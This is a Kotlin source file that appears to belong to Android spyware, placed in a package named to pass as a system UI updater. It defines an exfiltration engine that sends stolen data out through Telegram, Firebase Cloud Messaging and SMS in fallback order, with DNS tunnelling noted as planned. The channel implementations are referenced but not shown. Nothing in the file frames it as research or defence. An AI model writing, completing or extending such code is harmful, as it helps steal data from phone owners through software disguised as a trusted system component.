package com.android.systemui.updater.exfil

/**
 * Priority levels for exfiltration data.
 * Determines importance but not channel selection order (channels are tried in fixed order: Telegram -> FCM -> SMS).
 */
enum class Priority {
    LOW, MEDIUM, HIGH, CRITICAL
}

/**
 * Sealed class representing an exfiltration channel.
 * Each channel implements a send method that returns true on success, false on failure.
 */
sealed class ExfilChannel {
    abstract fun send(data: ByteArray): Boolean
}

/**
 * Engine responsible for sending data through multiple channels with fallback mechanism.
 * Tries channels in order: Telegram (primary) -> FCM (fallback 1) -> SMS (fallback 2).
 * DNS tunneling is planned as fallback 3 but not implemented.
 */
class ExfilEngine(
    // Default channel order: Telegram -> FCM -> SMS
    private val channels: List<ExfilChannel> = listOf(TelegramChannel, FCMChannel, SMSChannel)
) {
    /**
     * Sends data through available channels with fallback.
     * @param data The data to send as a byte array
     * @param priority Priority level of the data (logged but does not affect channel order)
     * @return true if at least one channel succeeded, false otherwise
     */
    fun send(data: ByteArray, priority: Priority): Boolean {
        // Log priority for debugging/monitoring (implementation dependent)
        // Example: Logger.exfil("Sending data with priority $priority")
        
        for (channel in channels) {
            if (channel.send(data)) {
                return true
            }
        }
        return false
    }
}